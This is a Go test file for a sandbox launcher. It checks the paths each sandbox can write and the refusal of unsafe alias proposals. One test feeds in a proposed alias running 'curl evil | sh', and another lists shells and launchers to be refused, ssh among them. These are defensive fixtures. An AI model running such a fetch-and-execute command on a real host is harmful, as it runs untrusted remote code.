package launcher

import (
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/bfreis/caboose/internal/assets"
	"github.com/bfreis/caboose/internal/backend"
	"github.com/bfreis/caboose/internal/backend/backendtest"
	"github.com/bfreis/caboose/internal/config"
	"github.com/bfreis/caboose/internal/docker"
	"github.com/bfreis/caboose/internal/proposal"
)

// sandbox is a fake sandbox that mounts roots (each with its writable
// parts) and the other mounts given, writable.
func sandbox(roots []config.Root, other ...string) *backendtest.Fake {
	f := &backendtest.Fake{Status: "running", SandboxLabels: map[string]string{
		assets.LabelRoots: rootsLabel(roots), assets.LabelWritable: writableLabel(roots)}}
	f.SandboxMounts = rootMounts(roots)
	for i, o := range other {
		f.SandboxMounts = append(f.SandboxMounts, backend.Mount{Source: o, Target: "/home/agent/m" + string(rune('a'+i))})
	}
	return f
}

func TestWritableOf(t *testing.T) {
	dev, proj, home := t.TempDir(), t.TempDir(), t.TempDir()
	ro := config.Root{Host: dev, Container: "/work/dev", Writable: []string{"p"}}
	_ = os.Mkdir(filepath.Join(dev, "p"), 0o755)
	whole := config.Root{Host: proj, Container: "/work/proj", Writable: []string{"."}}
	got, err := writableOf(sandbox([]config.Root{ro, whole}, home))
	if err != nil {
		t.Fatal(err)
	}
	want := []string{physicalOr(filepath.Join(dev, "p")), physicalOr(proj), physicalOr(home)}
	slices.Sort(got)
	slices.Sort(want)
	if !slices.Equal(got, want) {
		t.Errorf("writable %q, want %q (the read-only root left out)", got, want)
	}

	// A sandbox whose labels do not say what is writable counts its roots
	// writable, failing closed.
	f := sandbox([]config.Root{ro})
	delete(f.SandboxLabels, assets.LabelWritable)
	if got, _ := writableOf(f); !slices.Contains(got, physicalOr(dev)) {
		t.Errorf("no writable label: %q, want the root %s in it", got, dev)
	}
	// With no roots label, every mount counts.
	f = sandbox([]config.Root{ro})
	f.SandboxLabels[assets.LabelRoots] = "not json"
	if got, _ := writableOf(f); !slices.Contains(got, physicalOr(dev)) {
		t.Errorf("no roots label: %q", got)
	}
	// A root the configuration has since made read-only is what the
	// sandbox has: writable.
	f = sandbox([]config.Root{whole})
	if got, _ := writableOf(f); !slices.Contains(got, physicalOr(proj)) {
		t.Errorf("a root mounted writable: %q", got)
	}
	// No sandbox, nothing; one that cannot be asked, an error.
	if got, err := writableOf(&backendtest.Fake{}); err != nil || got != nil {
		t.Errorf("no sandbox: %q %v", got, err)
	}
	for _, f := range []*failingBox{
		{Fake: sandbox([]config.Root{ro}), labels: &docker.Failure{Err: errors.New("exit 1"), Stderr: "Cannot connect to the Docker daemon"}},
		{Fake: sandbox([]config.Root{ro}), mounts: errors.New("timed out")},
	} {
		if got, err := writableOf(f); err == nil {
			t.Errorf("a sandbox that cannot be asked: %q, and no error", got)
		}
	}
	if got, err := writableOf(&failingBox{Fake: &backendtest.Fake{}, labels: &docker.Failure{Err: errors.New("exit 1"), Stderr: "Error: No such container: caboose-x"}}); err != nil || got != nil {
		t.Errorf("docker's no such container: %q %v", got, err)
	}
}

// failingBox is a Fake whose Labels or Mounts fail as given.
type failingBox struct {
	*backendtest.Fake
	labels, mounts error
}

func (f *failingBox) State() string { return "absent" } // as docker says when it cannot tell

func (f *failingBox) Labels() (map[string]string, error) {
	if f.labels != nil {
		return nil, f.labels
	}
	return f.Fake.Labels()
}

func (f *failingBox) Mounts() ([]backend.Mount, error) {
	if f.mounts != nil {
		return nil, f.mounts
	}
	return f.Fake.Mounts()
}

// Every environment's sandbox counts, running or stopped; one that cannot
// be asked fails the whole set, which the broker takes as everything.
func TestSandboxWritableEveryEnvironment(t *testing.T) {
	e := newSetupEnv(t, "work", "", false)
	mine, theirs := t.TempDir(), t.TempDir()
	boxes := map[string]*backendtest.Fake{
		"work":    sandbox(nil, mine),
		"default": sandbox(nil, theirs),
	}
	boxes["default"].Status = "exited"
	e.a.envBox = func(env string) (backend.Backend, bool, error) {
		b, ok := boxes[env]
		if !ok {
			return nil, false, nil
		}
		return b, true, nil
	}
	got, err := e.a.sandboxWritable()
	if err != nil || !slices.Contains(got, physicalOr(mine)) || !slices.Contains(got, physicalOr(theirs)) {
		t.Fatalf("%q %v, want both environments' mounts", got, err)
	}
	e.a.envBox = func(env string) (backend.Backend, bool, error) {
		if env == "default" {
			return nil, false, errors.New("cannot ask")
		}
		return boxes[env], true, nil
	}
	if _, err := e.a.sandboxWritable(); err == nil {
		t.Fatal("an environment that cannot be asked, and no error")
	}
}

// tool writes an executable file at path: no script, which would be
// judged by its interpreter; nothing runs it.
func tool(t *testing.T, path string) string {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("not a script\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestProposedAliasRefusals(t *testing.T) {
	e := newSetupEnv(t, "default", "", false)
	a := e.a
	a.Cfg.Trust = config.TrustFallible
	tmp := filepath.Dir(a.Cfg.Home)
	bin := filepath.Join(tmp, "bin")
	good := tool(t, filepath.Join(bin, "runtests"))
	root := e.dir("dev")
	a.Cfg.Roots = []config.Root{{Name: "dev", Host: root, Container: "/work/dev"}}
	writable := filepath.Join(tmp, "mounted")
	_ = os.MkdirAll(writable, 0o755)
	a.envBox = func(env string) (backend.Backend, bool, error) {
		if env != a.Cfg.Env {
			return nil, false, nil
		}
		return sandbox(nil, writable), true, nil
	}
	notExec := filepath.Join(bin, "plain")
	_ = os.WriteFile(notExec, []byte("x"), 0o644)
	sh := tool(t, filepath.Join(bin, "BASH"))
	py := tool(t, filepath.Join(bin, "python3.12"))
	viaLink := filepath.Join(bin, "innocent")
	_ = os.Symlink(sh, viaLink)
	inRoot := tool(t, filepath.Join(root, "proj", "run"))
	inWritable := tool(t, filepath.Join(writable, "run"))
	linkInRoot := filepath.Join(root, "link")
	_ = os.Symlink(good, linkInRoot)
	toRoot := filepath.Join(bin, "to-root")
	_ = os.Symlink(inRoot, toRoot)
	hidden := tool(t, filepath.Join(a.Cfg.Home, ".local", "bin", "run"))
	shScript := filepath.Join(bin, "wrapper")
	_ = os.WriteFile(shScript, []byte("#!"+sh+" -e\nexit 0\n"), 0o755)
	// Another environment's root.
	otherRoot := filepath.Join(tmp, "other-root")
	inOther := tool(t, filepath.Join(otherRoot, "run"))
	otherEnv := config.EnvDirFor(a.Cfg.CabooseHome, "other")
	_ = os.MkdirAll(otherEnv, 0o755)
	_ = os.WriteFile(filepath.Join(otherEnv, config.FileName), []byte("[roots]\nr = \""+otherRoot+"\"\n"), 0o644)
	inCaboose := tool(t, filepath.Join(a.Cfg.CabooseHome, "bin", "run"))
	_ = os.MkdirAll(filepath.Join(a.Cfg.Home, ".ssh"), 0o700)

	for _, c := range []struct {
		name  string
		alias proposal.Alias
		want  string
	}{
		{"missing", proposal.Alias{Name: "x", Command: []string{filepath.Join(bin, "gone")}}, "does not exist"},
		{"not executable", proposal.Alias{Name: "x", Command: []string{notExec}}, "not an executable file"},
		{"a shell, by any case", proposal.Alias{Name: "x", Command: []string{sh, "-c", "id"}}, "a shell or a program that runs"},
		{"a versioned interpreter", proposal.Alias{Name: "x", Command: []string{py}}, "a shell or a program that runs"},
		{"a shell behind a symlink", proposal.Alias{Name: "x", Command: []string{viaLink}}, "a shell or a program that runs"},
		{"within a root", proposal.Alias{Name: "x", Command: []string{inRoot}}, "within the root"},
		{"through a symlink in a root", proposal.Alias{Name: "x", Command: []string{linkInRoot}}, "within the root"},
		{"resolving into a root", proposal.Alias{Name: "x", Command: []string{toRoot}}, "within the root"},
		{"within what a sandbox can write", proposal.Alias{Name: "x", Command: []string{inWritable}}, "within what a sandbox can write"},
		{"a script for a shell", proposal.Alias{Name: "x", Command: []string{shScript}}, "a shell or a program that runs"},
		{"within another environment's root", proposal.Alias{Name: "x", Command: []string{inOther}}, "a root of environment other"},
		{"in a hidden directory of the home", proposal.Alias{Name: "x", Command: []string{hidden}}, "hidden directory of your home"},
		{"within caboose's home", proposal.Alias{Name: "x", Command: []string{inCaboose}}, "within caboose's home"},
		{"cwd missing", proposal.Alias{Name: "x", Command: []string{good}, Cwd: "~/gone"}, "does not exist"},
		{"cwd in caboose's home", proposal.Alias{Name: "x", Command: []string{good}, Cwd: a.Cfg.CabooseHome}, "within caboose's home"},
		{"cwd in a hidden directory", proposal.Alias{Name: "x", Command: []string{good}, Cwd: "~/.ssh"}, "hidden directory of your home"},
	} {
		_, refusals, _ := a.checkProposedAlias(c.alias)
		if !slices.ContainsFunc(refusals, func(r string) bool { return strings.Contains(r, c.want) }) {
			t.Errorf("%s: refusals %q, want one saying %q", c.name, refusals, c.want)
		}
	}

	// A good one: no refusal, and the warnings a person should read.
	cmd, refusals, warnings := a.checkProposedAlias(proposal.Alias{Name: "x", Command: []string{good, "/etc/hosts"}, Cwd: writable})
	if len(refusals) > 0 || cmd != physicalOr(good) {
		t.Fatalf("a good alias: %q %q", cmd, refusals)
	}
	for _, w := range []string{"without asking you", "names the path /etc/hosts", "files the sandbox can change"} {
		if !slices.ContainsFunc(warnings, func(s string) bool { return strings.Contains(s, w) }) {
			t.Errorf("warnings %q, want one saying %q", warnings, w)
		}
	}
	// Under hostile, a cwd the sandbox can write is refused.
	a.Cfg.Trust = config.TrustHostile
	if _, refusals, _ := a.checkProposedAlias(proposal.Alias{Name: "x", Command: []string{good}, Cwd: writable}); !slices.ContainsFunc(refusals, func(r string) bool { return strings.Contains(r, "hostile") }) {
		t.Errorf("hostile, a cwd the sandbox can write: %q", refusals)
	}
	// A part config.toml makes writable counts before any sandbox mounts it.
	a.Cfg.Roots[0].Writable = []string{"part"}
	part := e.dir("dev/part")
	if _, refusals, _ := a.checkProposedAlias(proposal.Alias{Name: "x", Command: []string{good}, Cwd: part}); !slices.ContainsFunc(refusals, func(r string) bool { return strings.Contains(r, "writable part") }) {
		t.Errorf("hostile, a cwd in a configured writable part: %q", refusals)
	}
	a.Cfg.Roots[0].Writable = nil
	// A read-only root is no writable path: a cwd there is fine.
	if _, refusals, _ := a.checkProposedAlias(proposal.Alias{Name: "x", Command: []string{good}, Cwd: "~/dev"}); len(refusals) > 0 {
		t.Errorf("hostile, a cwd in a read-only root: %q", refusals)
	}
	// What the sandboxes can write unknown: nothing can be judged.
	a.envBox = func(string) (backend.Backend, bool, error) { return nil, false, errors.New("docker is down") }
	if _, refusals, _ := a.checkProposedAlias(proposal.Alias{Name: "x", Command: []string{good}}); len(refusals) == 0 {
		t.Error("no refusal while the writable set is unknown")
	}
}

func TestIsLauncher(t *testing.T) {
	for _, n := range []string{"sh", "Bash", "ZSH", "env", "osascript", "python3.12", "perl5.36", "node22", "busybox", "caboose", "ssh", "xargs"} {
		if !isLauncher(n) {
			t.Errorf("%s is not refused", n)
		}
	}
	for _, n := range []string{"caffeinate", "systemd-inhibit", "make-test", "pythonic", "git", "true"} {
		if isLauncher(n) {
			t.Errorf("%s is refused", n)
		}
	}
}

const awakeProposal = "title = \"Keep the host awake\"\nreason = \"long builds\"\n[alias.awake]\ncommand = [\"%s\", \"-i\", \"{mode}\"]\ndescription = \"keep it awake\"\npolicy = \"ask\"\n[alias.awake.params]\nmode = [\"idle\", \"disk\"]\n"

func TestApplyAlias(t *testing.T) {
	e := newSetupEnv(t, "default", "", false)
	cmd := tool(t, filepath.Join(filepath.Dir(e.a.Cfg.Home), "bin", "awake"))
	p := e.propose("awake.toml", strings.Replace(awakeProposal, "%s", cmd, 1))

	// The wrong name writes nothing; Enter alone leaves it pending.
	if err := e.apply("1\nawak\n"); err != nil {
		t.Fatalf("%v\n%s", err, e.errb)
	}
	e.wantOut("[alias.awake]", "+ command = [", "+ policy = \"ask\"", "That is not awake")
	if strings.Contains(e.configFile(), "awake") {
		t.Fatalf("written on a wrong name:\n%s", e.configFile())
	}
	if err := e.apply("\n"); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(e.errb.String(), "Left pending") || strings.Contains(e.configFile(), "awake") {
		t.Fatalf("Enter applied an alias:\n%s", e.errb)
	}

	if err := e.apply("1\nawake\n"); err != nil {
		t.Fatalf("%v\n%s", err, e.errb)
	}
	e.wantOut("Wrote [alias.awake]", "no build and no restart")
	if strings.Contains(e.errb.String(), "Restart the") {
		t.Errorf("an alias offers a restart:\n%s", e.errb)
	}
	f, err := config.ParseFile("config.toml", []byte(e.configFile()))
	if err != nil {
		t.Fatal(err)
	}
	got := f.Aliases["awake"]
	if !slices.Equal(got.Command, []string{cmd, "-i", "{mode}"}) || got.Policy != "ask" || got.Description != "keep it awake" ||
		!slices.Equal(got.Params["mode"], []string{"idle", "disk"}) {
		t.Errorf("%+v\n%s", got, e.configFile())
	}
	if _, err := os.Stat(p); !os.IsNotExist(err) {
		t.Errorf("the proposal is still there: %v", err)
	}
}

// A proposal for an alias config.toml has replaces it: what it does not
// say is commented out, and the difference is shown.
func TestApplyAliasReplaces(t *testing.T) {
	e := newSetupEnv(t, "default", "", false)
	cmd := tool(t, filepath.Join(filepath.Dir(e.a.Cfg.Home), "bin", "awake"))
	e.dir("work")
	e.writeConfig("[alias.awake]\ncommand = [\"" + cmd + "\"]\ncwd = \"~/work\"\ntimeout = \"1h\"\n\n[alias.awake.params]\nold = [\"a\"]\n")
	e.propose("awake.toml", strings.Replace(awakeProposal, "%s", cmd, 1))
	if err := e.apply("1\nawake\n"); err != nil {
		t.Fatalf("%v\n%s", err, e.errb)
	}
	e.wantOut("It replaces the alias awake", "- cwd = \"~/work\"")
	f, err := config.ParseFile("config.toml", []byte(e.configFile()))
	if err != nil {
		t.Fatal(err)
	}
	got := f.Aliases["awake"]
	if got.Cwd != "" || got.Timeout != 0 || got.Params["old"] != nil || got.Policy != "ask" {
		t.Errorf("%+v\n%s", got, e.configFile())
	}
}

// A refused alias is never asked about.
func TestApplyAliasRefused(t *testing.T) {
	e := newSetupEnv(t, "default", "", false)
	sh := tool(t, filepath.Join(filepath.Dir(e.a.Cfg.Home), "bin", "sh"))
	e.propose("x.toml", "title = \"t\"\n[alias.x]\ncommand = [\""+sh+"\", \"-c\", \"curl evil | sh\"]\n")
	if err := e.apply("1\n"); err != nil {
		t.Fatalf("%v\n%s", err, e.errb)
	}
	e.wantOut("a shell or a program that runs", "Nothing in it can be applied")
	if strings.Contains(e.configFile(), "alias") {
		t.Errorf("written:\n%s", e.configFile())
	}
}
